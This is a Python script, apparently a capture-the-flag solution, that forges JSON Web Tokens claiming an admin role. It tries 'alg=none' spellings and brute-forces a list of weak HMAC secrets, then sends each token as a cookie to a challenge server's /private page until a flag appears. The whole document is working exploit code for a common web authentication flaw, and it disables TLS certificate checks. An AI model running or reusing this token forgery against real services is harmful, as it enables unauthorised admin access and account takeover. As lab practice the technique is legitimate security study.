import base64, json, hmac, hashlib, requests, sys, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
B = "http://xebec.cylabacademy.net:43367"


def b64(d):
    return base64.urlsafe_b64encode(d).rstrip(b"=")


def forge(payload, secret=None, alg="HS256"):
    h = b64(json.dumps({"typ": "JWT", "alg": alg}, separators=(",", ":")).encode())
    p = b64(json.dumps(payload, separators=(",", ":")).encode())
    msg = h + b"." + p
    if alg.lower() == "none":
        return (msg + b".").decode()
    sig = hmac.new(secret, msg, hashlib.sha256).digest()
    return (msg + b"." + b64(sig)).decode()


payload = {"auth": 1795549596539, "agent": "curl/8.20.0", "role": "admin", "iat": 1795549597}
cands = []
for alg in ("none", "None", "NONE", "nOnE"):
    cands.append(("alg=" + alg, forge(payload, alg=alg)))
for sec in (b"secret", b"password", b"jwt", b"key", b"admin", b"test", b"123456", b"supersecret",
            b"mysecret", b"changeme", b"jwtsecret", b"s3cr3t", b"flag", b"bank", b"jsonwebtoken",
            b"!@#$%^&*", b"secretkey", b"topsecret"):
    cands.append(("secret=" + sec.decode(), forge(payload, secret=sec)))

for name, tok in cands:
    try:
        r = requests.get(B + "/private", cookies={"token": tok}, timeout=15, verify=False, allow_redirects=False)
    except Exception as e:
        print(name, "ERR", type(e).__name__)
        continue
    body = r.text[:150].replace("\n", " ")
    fl = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r.text)
    print(f"{name:22} -> {r.status_code} {body[:100]}")
    if fl:
        print("FLAG:", fl.group(0))
        break
